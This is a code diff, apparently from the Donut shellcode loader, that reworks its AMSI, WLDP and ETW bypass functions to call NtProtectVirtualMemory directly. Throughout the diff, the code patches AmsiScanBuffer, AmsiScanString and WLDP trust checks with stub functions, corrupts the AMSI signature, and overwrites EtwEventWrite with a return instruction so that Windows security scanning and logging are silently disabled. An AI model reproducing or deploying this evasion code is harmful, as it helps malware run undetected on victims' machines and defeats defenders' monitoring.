@@ -82,9 +82,12 @@ int AmsiScanStringStubEnd(int a, int b) {
 }
 
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-    HMODULE dll;
-    DWORD   len, op, t;
-    LPVOID  cs;
+    HMODULE  dll;
+    DWORD    len, op, t;
+    LPVOID   cs;
+    SIZE_T   rs;
+    PVOID    ba;
+    NTSTATUS status;
 
     // try load amsi. if unable, assume DLL doesn't exist
     // and return TRUE to indicate it's okay to continue
@@ -107,14 +110,16 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     if((int)len < 0) return FALSE;
     
     // make the memory writeable. return FALSE on error
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+    ba = cs;
+    rs = len;
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_EXECUTE_READWRITE, &op);
+    if(!NT_SUCCESS(status)) return FALSE;
       
     DPRINT("Overwriting AmsiScanBuffer");
     // over write with virtual address of stub
     Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
     // set memory back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
+    NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, op, &t);
   
     // resolve address of AmsiScanString. if not found,
     // return FALSE because it should exist ...
@@ -132,14 +137,16 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     if((int)len < 0) return FALSE;
     
     // make the memory writeable
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+    ba = cs;
+    rs = len;
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_EXECUTE_READWRITE, &op);
+    if(!NT_SUCCESS(status)) return FALSE;
       
     DPRINT("Overwriting AmsiScanString");
     // over write with virtual address of stub
     Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
     // set memory back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
+    NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, op, &t);
     
     return TRUE;
 }
@@ -151,6 +158,9 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     DWORD          i, op, t;
     BOOL           disabled = FALSE;
     PDWORD         Signature;
+    SIZE_T         rs;
+    PVOID          ba;
+    NTSTATUS       status;
     
     // try load amsi. if unable to load, assume
     // it doesn't exist and return TRUE to indicate
@@ -169,14 +179,16 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
       // is it "AMSI"?
       if(*Signature == *(PDWORD)inst->amsi) {
         // set memory protection for write access
-        inst->api.VirtualProtect(cs, sizeof(DWORD), 
-          PAGE_EXECUTE_READWRITE, &op);
+        ba = cs;
+        rs = sizeof(DWORD);
+        status = NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_EXECUTE_READWRITE, &op);
+        if(!NT_SUCCESS(status)) return FALSE;
           
         // change signature
         *Signature++;
         
         // set memory back to original protection
-        inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
+        NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, op, &t);
         disabled = TRUE;
         break;
       }
@@ -228,8 +240,8 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
           // get pointer
           ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
           // query if the pointer
-          res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
-          if(res != sizeof(mbi)) continue;
+          status = NtQueryVirtualMemory(NtCurrentProcess(), (LPVOID)ptr, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
+          if (!NT_SUCCESS(status)) return FALSE;
           
           // if it's a pointer to heap or stack
           if ((mbi.State   == MEM_COMMIT    ) &&
@@ -293,9 +305,12 @@ int WldpQueryDynamicCodeTrustStubEnd(int a, int b) {
 }
 
 BOOL DisableWLDP(PDONUT_INSTANCE inst) {
-    HMODULE wldp;
-    DWORD   len, op, t;
-    LPVOID  cs;
+    HMODULE  wldp;
+    DWORD    len, op, t;
+    LPVOID   cs;
+    SIZE_T   rs;
+    PVOID    ba;
+    NTSTATUS status;
     
     // try load wldp. if unable, assume DLL doesn't exist
     // and return TRUE to indicate it's okay to continue
@@ -318,13 +333,15 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     if((int)len < 0) return FALSE;
     
     // make the memory writeable. return FALSE on error
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+    ba = cs;
+    rs = len;
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_EXECUTE_READWRITE, &op);
+    if(!NT_SUCCESS(status)) return FALSE;
       
     // overwrite with virtual address of stub
     Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
     // set back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
+    NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, op, &t);
     
     // resolve address of WldpIsClassInApprovedList
     // if not found, return FALSE because it should exist
@@ -342,13 +359,15 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     if((int)len < 0) return FALSE;
     
     // make the memory writeable. return FALSE on error
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+    ba = cs;
+    rs = len;
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_EXECUTE_READWRITE, &op);
+    if(!NT_SUCCESS(status)) return FALSE;
       
     // overwrite with virtual address of stub
     Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
     // set back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
+    NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, op, &t);
     
     return TRUE;
 }
@@ -363,9 +382,12 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 
 #elif defined(BYPASS_ETW_B)
 BOOL DisableETW(PDONUT_INSTANCE inst) {
-    HMODULE dll;
-    DWORD   len, op, t;
-    LPVOID  cs;
+    HMODULE  dll;
+    DWORD    len, op, t;
+    LPVOID   cs;
+    SIZE_T   rs;
+    PVOID    ba;
+    NTSTATUS status;
 
     // get a handle to ntdll.dll
     dll = inst->api.LoadLibraryA(inst->ntdll);
@@ -377,8 +399,10 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 
 #ifdef _WIN64
     // make the memory writeable. return FALSE on error
-    if (!inst->api.VirtualProtect(
-        cs, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+    ba = cs;
+    rs = 1;
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_EXECUTE_READWRITE, &op);
+    if(!NT_SUCCESS(status)) return FALSE;
 
     DPRINT("Overwriting EtwEventWrite");
 
@@ -386,11 +410,13 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
     Memcpy(cs, "\xc3", 1);
 
     // set memory back to original protection
-    inst->api.VirtualProtect(cs, 1, op, &t);
+    NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, op, &t);
 #else
     // make the memory writeable. return FALSE on error
-    if (!inst->api.VirtualProtect(
-        cs, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+    ba = cs;
+    rs = 4;
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_EXECUTE_READWRITE, &op);
+    if(!NT_SUCCESS(status)) return FALSE;
 
     DPRINT("Overwriting EtwEventWrite");
 
@@ -398,7 +424,7 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
     Memcpy(cs, "\xc2\x14\x00\x00", 4);
 
     // set memory back to original protection
-    inst->api.VirtualProtect(cs, 4, op, &t);
+    NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, op, &t);
 #endif
 
     return TRUE;
